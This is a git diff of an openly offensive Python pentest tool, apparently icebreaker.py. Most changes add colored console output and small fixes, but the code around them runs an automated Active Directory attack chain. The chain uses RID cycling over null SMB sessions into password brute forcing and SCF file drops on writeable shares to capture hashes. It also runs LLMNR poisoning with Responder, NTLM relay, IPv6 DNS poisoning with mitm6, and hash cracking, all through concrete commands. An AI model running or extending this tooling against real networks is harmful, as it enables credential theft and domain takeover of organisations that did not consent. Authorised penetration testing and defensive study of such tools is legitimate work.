@@ -11,15 +11,14 @@ import random
 import asyncio
 import requests
 import argparse
-import functools
 import netifaces
 from datetime import datetime
-from itertools import zip_longest
+from termcolor import colored
 from libnmap.process import NmapProcess
 from asyncio.subprocess import PIPE, STDOUT
 from netaddr import IPNetwork, AddrFormatError
+from subprocess import Popen, PIPE, CalledProcessError
 from libnmap.parser import NmapParser, NmapParserException
-from subprocess import Popen, PIPE, check_output, CalledProcessError
 
 # Disable the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -41,6 +40,19 @@ def parse_args():
     parser.add_argument("--auto", action="store_true", help="Start up Empire and DeathStar to automatically get domain admin")
     return parser.parse_args()
 
+# Colored terminal output
+def print_info(msg):
+    print(colored('[*] ', 'blue') + msg)
+
+def print_good(msg):
+    print(colored('[+] ', 'green') + msg)
+
+def print_bad(msg):
+    print(colored('[-] ', 'red') + msg)
+
+def print_great(msg):
+    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))
+
 def parse_nmap(args):
     '''
     Either performs an Nmap scan or parses an Nmap xml file
@@ -50,7 +62,8 @@ def parse_nmap(args):
         try:
             report = NmapParser.parse_fromfile(args.xml)
         except FileNotFoundError:
-            sys.exit('[-] Host file not found: {}'.format(args.xml))
+            print_bad('Host file not found: {}'.format(args.xml))
+            sys.exit()
     elif args.hostlist:
         hosts = []
         with open(args.hostlist, 'r') as hostlist:
@@ -61,14 +74,18 @@ def parse_nmap(args):
                     if '/' in line:
                         hosts += [str(ip) for ip in IPNetwork(line)]
                     elif '*' in line:
-                        sys.exit('[-] CIDR notation only in the host list e.g. 10.0.0.0/24')
+                        print_bad('CIDR notation only in the host list e.g. 10.0.0.0/24')
+                        sys.exit()
                     else:
                         hosts.append(line)
                 except (OSError, AddrFormatError):
-                    sys.exit('[-] Error importing host list file. Are you sure you chose the right file?')
+                    print_bad('Error importing host list file. Are you sure you chose the right file?')
+                    sys.exit()
+
         report = nmap_scan(hosts)
+
     else:
-        print('[-] Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
+        print_bad('Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
 or "-l [hostlist.txt]" option to run an Nmap scan with a hostlist file.')
         sys.exit()
     return report
@@ -96,7 +113,7 @@ def nmap_status_printer(nmap_proc):
         # Every 30 seconds print that Nmap is still running
         if i % 30 == 0:
             x += .5
-            print("[*] Nmap running: {} min".format(str(x)))
+            print_info("Nmap running: {} min".format(str(x)))
 
         time.sleep(1)
 
@@ -107,7 +124,7 @@ def run_nse_scripts(args, hosts, nse_scripts_run):
     hosts = []
     if nse_scripts_run == False:
         if len(hosts) > 0:
-            print("[*] Running missing NSE scripts")
+            print_info("Running missing NSE scripts")
             report = nmap_scan(hosts)
             hosts = get_hosts(args, report)
             return hosts
@@ -129,7 +146,8 @@ def parse_nse(hosts, args, iface):
     anon_share_found = False
 
     if 'scf' not in args.skip.lower():
-        print('\n[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')
+        print()
+        print_info('Attack 2: SCF file upload to anonymously writeable shares for hash collection')
 
     for host in hosts:
         ip = host.address
@@ -149,18 +167,31 @@ def parse_nse(hosts, args, iface):
 
     if 'scf' not in args.skip.lower():
         if anon_share_found == False:
-            print('[-] No anonymously writeable shares found')
+            print_bad('No anonymously writeable shares found')
 
     if len(smb_signing_disabled_hosts) > 0:
+        old_lines = None
         filename = 'smb-signing-disabled-hosts.txt'
         if os.path.isfile(filename):
-            f = open(filename, 'a+')
-            lines = f.readlines()
+            f = open(filename, 'r')
+            old_lines = f.readlines()
             f.close()
-            for host in smb_signing_disabled_hosts:
-                host = host + '\n'
-                if host not in lines:
+
+        for host in smb_signing_disabled_hosts:
+            host = host + '\n'
+            # Slow, fix file write later
+            if old_lines:
+                if host not in old_lines:
                     write_to_file(filename, host, 'a+')
+            else:
+                write_to_file(filename, host, 'a+')
+
+
+        return True
+
+    else:
+
+        return False
 
 def run_smbclient(server, share_name, action, scf_filepath):
     '''
@@ -170,8 +201,9 @@ def run_smbclient(server, share_name, action, scf_filepath):
     smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
     write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
     smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
-    print("[*] Running '{}' with the verb '{}'".format(smbclient_cmd, action))
+    print_info("Running '{}' with the verb '{}'".format(smbclient_cmd, action))
     stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
+
     return stdout, stderr
 
 def write_scf_files(lines, ip, args, anon_share_found, iface):
@@ -195,8 +227,8 @@ def write_scf_files(lines, ip, args, anon_share_found, iface):
                         if anon_share_found == False:
                             anon_share_found = True
 
-                        print('[+] Writeable share found at: '+share)
-                        print('[*] Attempting to write SCF file to share')
+                        print_good('Writeable share found at: '+share)
+                        print_info('Attempting to write SCF file to share')
 
                         action = 'put'
                         stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
@@ -204,13 +236,13 @@ def write_scf_files(lines, ip, args, anon_share_found, iface):
 
                         err_strings = ['Error:', 'Errno']
                         if not any(x in stdout for x in err_strings) and len(stdout) > 1:
-                            print('[+] Successfully wrote SCF file to: {}'.format(share))
-                            write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
+                            print_good('Successfully wrote SCF file to: {}'.format(share))
+                            write_to_file('logs/shares-with-SCF.txt', share + '\n', 'a+')
                         else:
                             stdout_lines = stdout.splitlines()
                             for line in stdout_lines:
                                 if 'Error:' in line:
-                                    print('[-] Error writing SCF file: \n    '+line.strip())
+                                    print_bad('Error writing SCF file: \n    '+line.strip())
 
     return anon_share_found
 
@@ -254,7 +286,7 @@ def get_hosts(args, report):
     '''
     hosts = []
 
-    print('[*] Parsing hosts')
+    print_info('Parsing hosts')
     for host in report.hosts:
         if host.is_up():
             # Get open services
@@ -263,7 +295,8 @@ def get_hosts(args, report):
                     if s.state == 'open':
                         hosts.append(host)
     if len(hosts) == 0:
-        sys.exit('[-] No hosts with port 445 open')
+        print_bad('No hosts with port 445 open')
+        sys.exit()
 
     return hosts
 
@@ -364,7 +397,7 @@ def get_AD_domains(null_sess_hosts):
 
     if len(uniq_doms) > 0:
         for d in uniq_doms:
-            print('[+] Domain found: ' + d) 
+            print_good('Domain found: ' + d) 
 
     return uniq_doms
 
@@ -385,7 +418,7 @@ def get_usernames(ridenum_output, prev_users):
                 user = line.split()[2].strip()
                 if user not in prev_users:
                     prev_users.append(user)
-                    print('[+] User found: ' + user)
+                    print_good('User found: ' + user)
 
                     if ip in ip_users:
                         ip_users[ip] += [user]
@@ -492,11 +525,11 @@ def parse_brute_output(brute_output, prev_creds):
 
             duplicate = check_found_passwords(dom_user_pwd)
             if duplicate == False:
-                print('[!] Password found! '+dom_user_pwd)
+                print_great('Password found! '+dom_user_pwd)
                 log_pwds([dom_user_pwd])
 
     if pw_found == False:
-        print('[-] No reverse bruteforce password matches found')
+        print_bad('No reverse bruteforce password matches found')
 
     return prev_creds
 
@@ -509,13 +542,14 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
     dom_cmds = create_cmds(hosts, dom_cmd)
 
-    print('\n[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
-    print('[*] Checking for null SMB sessions')
-    print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])
+    print()
+    print_info('Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
+    print_info('Checking for null SMB sessions')
+    print_info('Example command that will run: '+dom_cmds[0].split('&& ')[1])
 
     rpc_output = async_get_outputs(loop, dom_cmds)
     if rpc_output == None:
-        print('[-] Error attempting to look up null SMB sessions')
+        print_bad('Error attempting to look up null SMB sessions')
         return
 
     # {ip:'domain_name', 'domain_sid'}
@@ -524,24 +558,24 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     # Create master list of null session hosts
     null_sess_hosts.update(chunk_null_sess_hosts)
     if len(null_sess_hosts) == 0:
-        print('[-] No null SMB sessions available')
+        print_bad('No null SMB sessions available')
         return None, None, None
     else:
         null_hosts = []
         for ip in null_sess_hosts:
-            print('[+] Null session found: {}'.format(ip))
+            print_good('Null session found: {}'.format(ip))
             null_hosts.append(ip)
 
     domains = get_AD_domains(null_sess_hosts)
 
     # Gather usernames using ridenum.py
-    print('[*] Checking for usernames. This may take a bit...')
+    print_info('Checking for usernames. This may take a bit...')
     ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
     ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
-    print('[*] Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
+    print_info('Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
     ridenum_output = async_get_outputs(loop, ridenum_cmds)
     if len(ridenum_output) == 0:
-        print('[-] No usernames found')
+        print_bad('No usernames found')
         return
 
     # {ip:[username, username2], ip2:[username, username2]}
@@ -550,7 +584,7 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     # Creates a list of unique commands which only tests
     # each username/password combo 2 times and not more
     brute_cmds = create_brute_cmds(ip_users, passwords)
-    print('[*] Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
+    print_info('Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
     brute_output = async_get_outputs(loop, brute_cmds)
 
     # Will always return at least an empty dict()
@@ -639,7 +673,7 @@ def run_proc(cmd):
                 filename = x.split('/')[-1] + '.log'
                 break
 
-    print('[*] Running: {}'.format(cmd))
+    print_info('Running: {}'.format(cmd))
     f = open('logs/'+filename, 'a+')
     proc = Popen(cmd_split, stdout=f, stderr=STDOUT)
 
@@ -688,8 +722,8 @@ def crack_hashes(hashes):
             try:
                 john_proc = run_proc(john_cmd)
             except FileNotFoundError:
-                print('[-] Error running john for password cracking, \
-                       try: cd submodules/JohnTheRipper/src && ./configure && make')
+                print_bad('Error running john for password cracking, \
+                           try: cd submodules/JohnTheRipper/src && ./configure && make')
             procs.append(john_proc)
 
     return procs
@@ -703,6 +737,11 @@ def parse_john_show(out, prev_creds):
         line = line.split(':')
         if len(line) > 3:
             user = line[0]
+
+            # No machine accounts
+            if user.endswith('$'):
+                continue
+
             pw = line[1]
             host = line[2]
             host_user_pwd = host+'\\'+user+':'+pw
@@ -710,7 +749,7 @@ def parse_john_show(out, prev_creds):
                 prev_creds.append(host_user_pwd)
                 duplicate = check_found_passwords(host_user_pwd)
                 if duplicate == False:
-                    print('[!] Password found! '+host_user_pwd)
+                    print_great('Password found! '+host_user_pwd)
                     log_pwds([host_user_pwd])
 
     return prev_creds
@@ -727,7 +766,7 @@ def get_cracked_pwds(prev_creds):
             if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
                 out, err = Popen('submodules/JohnTheRipper/run/john --show hashes/{}'.format(x).split(), stdout=PIPE, stderr=PIPE).communicate()
                 if err:
-                    print('[-] Error getting cracked hashes: {}'.format(err))
+                    print_bad('Error getting cracked hashes: {}'.format(err))
                 prev_creds = parse_john_show(out, prev_creds)
 
     return prev_creds
@@ -752,7 +791,7 @@ def start_responder_llmnr(iface):
     edit_responder_conf('On', ['HTTP', 'SMB'])
     resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
     resp_proc = run_proc(resp_cmd)
-    print('[*] Responder-Session.log:')
+    print_info('Responder-Session.log:')
     return resp_proc
 
 def run_relay_attack(iface, args):
@@ -795,10 +834,11 @@ def check_ntlmrelay_error(line, file_lines):
     Checks for ntlmrelay errors
     '''
     if 'Traceback (most recent call last):' in line:
-        print('[-] Error running ntlmrelayx:\n')
+        print_bad('Error running ntlmrelayx:\n')
         for l in file_lines:
             print(l.strip())
-        print('\n[-] Hit CTRL-C to quit')
+        print()
+        print_bad('Hit CTRL-C to quit')
         return True
     else:
         return False
@@ -813,7 +853,7 @@ def format_mimi_data(dom, user, auth, hash_or_pw, prev_creds):
         prev_creds.append(dom_user_pwd)
         duplicate = check_found_passwords(dom_user_pwd)
         if duplicate == False:
-            print('[!] {} found! {}'.format(hash_or_pw, dom_user_pwd))
+            print_great('{} found! {}'.format(hash_or_pw, dom_user_pwd))
             log_pwds([dom_user_pwd])
 
     return prev_creds
@@ -901,7 +941,7 @@ def get_responder_hashes(line, prev_creds):
         # Don't bother with cracking machine accounts (WIN10$)
         if '$' not in user and user not in prev_creds:
             prev_creds.append(user)
-            print('[+] Hash found for {}!'.format(user))
+            print_good('Hash found for {}!'.format(user))
             if ntlm_hash.count(':') == 5:
                 new_hash = {'NTLMv2':[ntlm_hash]}
             elif ntlm_hash.count(':') == 4:
@@ -931,7 +971,7 @@ def cleanup_mitm6(mitm6_proc):
 
     pid = mitm6_proc.pid
     os.kill(pid, signal.SIGINT)
-    print('[*] Waiting on mitm6 to cleanly shut down...')
+    print_info('Waiting on mitm6 to cleanly shut down...')
     time.sleep(5)
 
 def get_user_from_ntlm_hash(ntlm_hash):
@@ -991,7 +1031,7 @@ def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
         prev_creds.append(host_user_pwd)
         duplicate = check_found_passwords(host_user_pwd)
         if duplicate == False:
-            print('[!] User created! '+host_user_pwd)
+            print_great('User created! '+host_user_pwd)
             log_pwds([host_user_pwd])
 
     return prev_creds, successful_auth
@@ -1011,11 +1051,13 @@ def do_ntlmrelay(prev_creds, args, iface):
     '''
     mitm6_proc = None
 
-    print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
+    print()
+    print_info('Attack 4: NTLM relay with Responder and ntlmrelayx')
     resp_proc, ntlmrelay_proc = run_relay_attack(iface, args)
 
     if 'dns' not in args.skip:
-        print('\n[*] Attack 5: IPv6 DNS Poison')
+        print()
+        print_info('Attack 5: IPv6 DNS Poison')
         mitm6_proc = run_ipv6_dns_poison()
 
     ########## CTRL-C HANDLER ##############################
@@ -1023,7 +1065,7 @@ def do_ntlmrelay(prev_creds, args, iface):
         '''
         Catch CTRL-C and kill procs
         '''
-        print('\n[-] CTRL-C caught, cleaning up and closing')
+        print_info('CTRL-C caught, cleaning up and closing')
 
         # Kill procs
         cleanup_responder(resp_proc, prev_creds)
@@ -1045,7 +1087,7 @@ def do_ntlmrelay(prev_creds, args, iface):
     ########## CTRL-C HANDLER ##############################
 
     mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
-    print('\n[*] ntlmrelayx.py output:')
+    print_info('ntlmrelayx.py output:')
     ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
     file_lines = follow_file(ntlmrelay_file)
 
@@ -1081,14 +1123,15 @@ def check_for_nse_scripts(hosts):
 
 def run_proc_xterm(cmd):
     '''
-    Runs a process in an xterm window
+    Runs a process in an xterm window that doesn't die with icebreaker.py
     '''
-    xterm_cmd = 'xterm -hold -e {}'
+    xterm_cmd = 'nohup xterm -hold -e {}'
     full_cmd = xterm_cmd.format(cmd)
-    print('[*] Running: {}'.format(full_cmd))
+    print_info('Running: {}'.format(full_cmd))
     # Split it only on xterm args, leave system command in 1 string
-    cmd_split = full_cmd.split(' ',3)
-    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)
+    cmd_split = full_cmd.split(' ', 4)
+    # preexec_fn allows the xterm window to stay alive after closing script
+    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE, preexec_fn=os.setpgrp)
 
     return proc
 
@@ -1216,7 +1259,7 @@ def main(report, args):
             hosts = run_nse_scripts(args, hosts)
 
         for h in hosts:
-            print('[+] SMB open: {}'.format(h.address))
+            print_good('SMB open: {}'.format(h.address))
 
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
@@ -1224,15 +1267,20 @@ def main(report, args):
         loop.close()
 
         # ATTACK 2: SCF file upload to writeable shares
-        parse_nse(hosts, args, iface)
+        smb_hosts_found = parse_nse(hosts, args, iface)
+        if smb_hosts_found == False:
+            print_bad('No hosts with SMB port 445 open')
+            if 'relay' not in args.skip.lower():
+                print_bad('SMB Relay Attack 4 will likely fail to get credentials')
 
     else:
-        print('[-] No hosts with port 445 open. \
+        print_bad('No hosts with port 445 open. \
                    Skipping all attacks except LLMNR/NBNS/mDNS poison attack with Responder.py')
 
     # ATTACK 3: LLMNR poisoning
     if 'llmnr' not in args.skip.lower():
-        print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
+        print()
+        print_info('Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
         prev_lines = []
         resp_proc = start_responder_llmnr(iface)
 
@@ -1256,7 +1304,7 @@ def main(report, args):
             prev_creds = cleanup_responder(resp_proc, prev_creds)
 
         except KeyboardInterrupt:
-            print('\n[-] Killing Responder.py and moving on')
+            print_info('Killing Responder.py and moving on')
             prev_creds = cleanup_responder(resp_proc, prev_creds)
             # Give responder some time to die with dignity
             time.sleep(2)
@@ -1269,12 +1317,12 @@ def main(report, args):
 if __name__ == "__main__":
     args = parse_args()
     if os.geteuid():
-        exit('[-] Run as root')
+        print_bad('Run as root')
+        sys.exit()
     report = parse_nmap(args)
     main(report, args)
 
 # Todo
-# make the empire launcher first add administrative user
 # give it agent detection so it can try using icebreaker user if fail
 # add more common passwords for rev bruteforce Password1, <previousseason><year>
 
